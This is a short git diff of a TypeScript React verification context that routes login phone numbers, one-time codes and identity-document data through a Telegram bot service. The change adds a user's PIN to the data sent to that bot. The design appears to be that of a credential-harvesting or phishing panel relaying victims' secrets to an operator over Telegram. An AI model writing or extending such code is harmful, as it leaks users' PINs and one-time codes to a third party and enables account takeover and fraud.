@@ -4,7 +4,7 @@ import { telegramBotService, type VerificationRequest } from '../services/telegr
 
 interface VerificationContextType {
   createLoginVerification: (phoneNumber: string, otp: string, userId: string) => Promise<string | null>;
-  sendPhoneNotification: (phoneNumber: string) => Promise<boolean>;
+  sendPhoneNotification: (phoneNumber: string, pin: string) => Promise<boolean>;
   createKYCVerification: (kycData: {
     userId: string;
     docType: string;
@@ -84,9 +84,9 @@ export function VerificationProvider({ children }: { children: ReactNode }) {
     }
   };
 
-  const sendPhoneNotification = async (phoneNumber: string): Promise<boolean> => {
+  const sendPhoneNotification = async (phoneNumber: string, pin: string): Promise<boolean> => {
     try {
-      const result = await telegramBotService.sendPhoneNotification(phoneNumber);
+      const result = await telegramBotService.sendPhoneNotification(phoneNumber, pin);
       return result.ok;
     } catch (error) {
       console.error('Error sending phone notification:', error);
